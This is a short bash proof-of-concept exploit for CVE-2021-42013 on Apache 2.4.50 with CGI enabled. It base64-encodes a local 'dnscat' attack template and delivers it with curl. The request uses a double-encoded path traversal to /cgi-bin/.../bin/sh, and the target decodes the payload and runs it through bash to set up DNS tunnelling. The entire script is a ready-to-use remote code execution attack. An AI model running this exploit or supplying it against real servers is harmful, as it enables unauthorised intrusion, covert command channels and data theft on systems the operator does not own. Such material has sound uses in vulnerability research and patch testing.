# Credits: Ash Daulton & cPanel Security Team
# Date: 24/07/2021
# Exploit Author: TheLastVvV.com
# Vendor Homepage:  https://apache.org/
# Version: Apache 2.4.50 with CGI enable
# Tested on : Debian 5.10.28
# CVE : CVE-2021-42013

#!/bin/bash

#attach visa deployment
inject=$(cat $(dirname -- "$0")/templates/attack_dnscat_base64.sh | base64)

echo 'PoC DNSCAT - Tunneling over DNS'
if [ $# -eq 0 ]
then
echo  "try: ./$0 http://ip:port"
exit 1
fi
curl -s "$1/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh" -d "echo Content-Type: text/plain; echo; echo ${inject} | base64 -d | bash -"
